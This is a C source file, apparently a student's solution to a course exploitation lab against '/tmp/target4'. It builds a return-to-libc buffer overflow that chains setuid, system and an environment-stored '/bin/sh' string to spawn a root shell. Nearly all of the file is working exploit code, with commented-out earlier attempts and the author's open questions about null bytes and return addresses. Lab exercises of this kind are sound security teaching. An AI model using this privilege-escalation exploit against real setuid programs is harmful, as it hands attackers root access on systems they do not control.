#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  char *env[2];

  // set an environment variable
  int success = setenv("SHELLCODE", "/bin/sh", 0);
  char* env_ptr = getenv("SHELLCODE");
  printf("Shellcode environment variable address: %p; success: %d\n", getenv("SHELLCODE"), success);
  printf("Env ptr: 0x%x, %p\n", env_ptr, env_ptr);

  // Below is for normal return to libc, but we want root return to libc
  /*
  char buffer[20]; // target4 takes size of 4, plus 3 bytes of fluff will get us to the ebp and eip
  // EBP: Random
  // EIP: System
  // EIP + 4: Dummy return (Can be exit())
  // EIP + 8: Shell address
  memset(buffer, 0x90, 8); // overwrite EBP also with NOP
  memcpy(buffer+8, system_addr, 4); // system address goes in EIP
  memset(buffer+12, 'A', 4); // dummy return address (Can this be exit()?)
  // memcpy(buffer+12, exit_addr, 4); // Can this be exit()?
  memcpy(buffer+16, shell_addr, 4); // shell address
  */
  // EBP: Random
  // EIP: setuid
  // EIP + 4: Dummy return from setuid (Should this be sysetm?)
  // EIP + 8: setuid value (0)
  // EPI + 12: Shell code?
  char buffer[24];
  memset(buffer, 0x90, 8); // Overwrite EBP with NOP
  memcpy(buffer+8, setuid_addr, 4);
  // memset(buffer+12, 'A', 4); // dummy return address (Should this be system?)
  // memcpy(buffer+12, exit_addr, 4); // test using exit as return address for setuid
  memcpy(buffer+12, system_addr, 4); // Can this be system?
  // memset(buffer+16, 0, 4); // 0 is argument for setuid // Null byte issue here?
  memset(buffer+16, 0x01, 4); // 0 is argument for setuid
  memcpy(buffer+20, shell_addr, 4);

  args[0] = TARGET;
  args[1] = buffer; 
  args[2] = NULL;
  
  env[0] = env_ptr;
  env[1] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

